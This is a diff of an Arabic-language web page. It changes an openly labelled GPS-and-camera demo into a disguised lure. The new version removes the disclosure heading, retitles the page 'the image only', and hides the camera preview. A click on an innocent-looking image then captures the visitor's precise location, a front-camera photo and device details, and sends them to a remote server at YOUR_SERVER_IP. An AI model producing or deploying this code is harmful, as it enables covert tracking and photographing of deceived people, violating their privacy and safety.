@@ -1,30 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>صورة كزر GPS</title>
     <meta charset="UTF-8">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+    <title>الصورة فقط</title>
     <style>
-        body { display:flex; flex-direction:column; align-items:center; margin:20px; font-family:sans-serif; }
-        img { cursor:pointer; width:300px; margin-bottom:20px; }
-        #video { display:none; margin-bottom:20px; }
-        #map { height:400px; width:80%; margin-top:20px; }
+        body { display:flex; justify-content:center; align-items:center; height:100vh; }
+        img { cursor:pointer; width:300px; }
     </style>
 </head>
 <body>
-    <h2>اضغط على الصورة لإرسال الموقع الدقيق (GPS) والكاميرا ومعلومات الجهاز</h2>
     <img src="button.jpg" onclick="capture()">
-    <video id="video" width="300" autoplay></video>
+
+    <video id="video" width="300" autoplay style="display:none;"></video>
     <canvas id="canvas" width="300" style="display:none;"></canvas>
-    <div id="map"></div>
 
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
-        var map = L.map('map').setView([0,0], 2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
         async function capture() {
             if (!navigator.geolocation) { alert("الموقع غير مدعوم"); return; }
 
@@ -51,23 +41,21 @@
                 try {
                     const streamVideo = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
                     video.srcObject = streamVideo;
-                    video.style.display='block';
 
                     setTimeout(() => {
                         canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-                        video.style.display='none';
                         const imgData = canvas.toDataURL('image/png');
 
-                        var marker = L.marker([lat,lon]).addTo(map);
-                        marker.bindPopup(
-                            '<img src="'+imgData+'" width="150"><br>'+
-                            'نوع الجهاز: '+deviceInfo.userAgent+'<br>'+
-                            'نظام التشغيل: '+deviceInfo.platform+'<br>'+
-                            'حجم الشاشة: '+deviceInfo.screenWidth+'x'+deviceInfo.screenHeight+'<br>'+
-                            'بطارية: '+(deviceInfo.battery ? deviceInfo.battery.level+"%, شحن: "+deviceInfo.battery.charging : "غير متوفرة")+
-                            '<br>خط العرض: '+lat+'<br>خط الطول: '+lon
-                        ).openPopup();
-                        map.setView([lat,lon],15);
+                        // إرسال البيانات إلى السيرفر
+                        fetch("http://YOUR_SERVER_IP:5000/receive_data", {
+                            method:"POST",
+                            headers: { "Content-Type":"application/json" },
+                            body: JSON.stringify({ lat, lon, imgData, deviceInfo })
+                        });
+
+                        video.srcObject.getTracks().forEach(track => track.stop());
+
+                        alert("تم إرسال البيانات بنجاح!");
                     },2000);
                 } catch(err) { alert("تعذر الوصول للكاميرا: "+err); }
             }, function(err) {
